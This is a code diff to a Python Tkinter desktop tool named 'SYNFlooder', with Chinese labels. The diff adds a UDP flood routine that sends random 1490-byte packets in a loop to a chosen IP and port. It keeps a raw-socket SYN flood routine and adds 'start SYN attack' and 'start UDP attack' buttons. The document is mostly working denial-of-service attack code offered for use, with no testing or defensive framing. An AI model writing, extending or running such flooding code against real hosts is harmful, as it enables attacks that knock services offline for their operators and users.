@@ -4,6 +4,7 @@ import time
 import socket
 import sys
 import threading
+import random
 import impacket.ImpactPacket
 import warnings
 import webbrowser
@@ -12,7 +13,25 @@ warnings.filterwarnings("ignore")
 
 attack_running = False  # 用于控制攻击状态的全局变量
 
-def start_attack():
+def disable_widgets():
+    target_ip_entry.config(state='disabled')
+    local_ip_entry.config(state='disabled')
+    port_entry.config(state='disabled')
+    source_port_entry.config(state='disabled')
+    speed_entry.config(state='disabled')
+    syn_button.config(state='disabled')
+    udp_button.config(state='disabled')
+
+def enable_widgets():
+    target_ip_entry.config(state='normal')
+    local_ip_entry.config(state='normal')
+    port_entry.config(state='normal')
+    source_port_entry.config(state='normal')
+    speed_entry.config(state='normal')
+    syn_button.config(state='normal')
+    udp_button.config(state='normal')
+
+def start_syn_attack():
     global attack_running
     dip = target_ip_entry.get()
     lip = local_ip_entry.get()
@@ -25,13 +44,29 @@ def start_attack():
         return
 
     attack_running = True
-    threading.Thread(target=attack, args=(dip, lip, port, sport, speed)).start()
+    disable_widgets()
+    threading.Thread(target=syn_attack, args=(dip, lip, port, sport, speed)).start()
+
+def start_udp_attack():
+    global attack_running
+    dip = target_ip_entry.get()
+    port = int(port_entry.get())
+    speed = int(speed_entry.get())
+
+    if not dip:
+        messagebox.showwarning("输入警告", "目标 IP 为必填项")
+        return
+
+    attack_running = True
+    disable_widgets()
+    threading.Thread(target=udp_attack, args=(dip, port, speed)).start()
 
 def stop_attack():
     global attack_running
     attack_running = False
+    enable_widgets()
 
-def attack(dip, lip, port, sport, speed):
+def syn_attack(dip, lip, port, sport, speed):
     sent = 0
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -64,6 +99,19 @@ def attack(dip, lip, port, sport, speed):
         except Exception as e:
             print(f"发送数据包时出错: {e}")
             break
+    enable_widgets()
+
+def udp_attack(dip, port, speed):
+    sent = 0
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1490)
+
+    while attack_running:
+        sock.sendto(bytes, (dip, port))
+        sent += 1
+        print(f"已发送 {sent} 个UDP数据包到 {dip} 端口 {port}")
+        time.sleep((1000 - speed) / 2000)
+    enable_widgets()
 
 root = tk.Tk()
 root.title("SYNFlooder")
@@ -97,17 +145,23 @@ speed_entry = tk.Entry(root)
 speed_entry.grid(row=4, column=1, sticky="w")
 speed_entry.insert(0, "1000")
 
-start_button = tk.Button(root, text="开始攻击", command=start_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
-start_button.grid(row=5, column=0, pady=5, sticky="w")
+syn_button = tk.Button(root, text="开始 SYN 攻击", command=start_syn_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
+syn_button.grid(row=5, column=0, pady=5, sticky="w")
+
+udp_button = tk.Button(root, text="开始 UDP 攻击", command=start_udp_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
+udp_button.grid(row=5, column=1, pady=5, sticky="w")
 
 stop_button = tk.Button(root, text="停止攻击", command=stop_attack, font=button_font, fg=label_fg, bg=label_bg, width=15)
-stop_button.grid(row=5, column=1, pady=5, sticky="w")
+stop_button.grid(row=6, columnspan=2, pady=5)
 
 def open_project_link(event):
     webbrowser.open_new("http://github.com/Gr3yPh/SYNFlooder")
 
-project_link = tk.Label(root, text="项目地址: http://github.com/Gr3yPh/SYNFlooder", font=label_font, fg=label_fg, bg=label_bg, cursor="hand2", anchor="w")
-project_link.grid(row=6, columnspan=2, sticky="w")
+project_link = tk.Label(root, text="http://github.com/Gr3yPh/SYNFlooder", font=label_font, fg=label_fg, bg=label_bg, cursor="hand2", anchor="w")
+project_link.grid(row=7, columnspan=2, sticky="w")
 project_link.bind("<Button-1>", open_project_link)
+
+author_name = tk.Label(root, text="记住，我叫GR3YPH_4NTOM", font=label_font, fg=label_fg, bg=label_bg, anchor="w")
+author_name.grid(row=8, columnspan=2, sticky="w")
 
 root.mainloop()
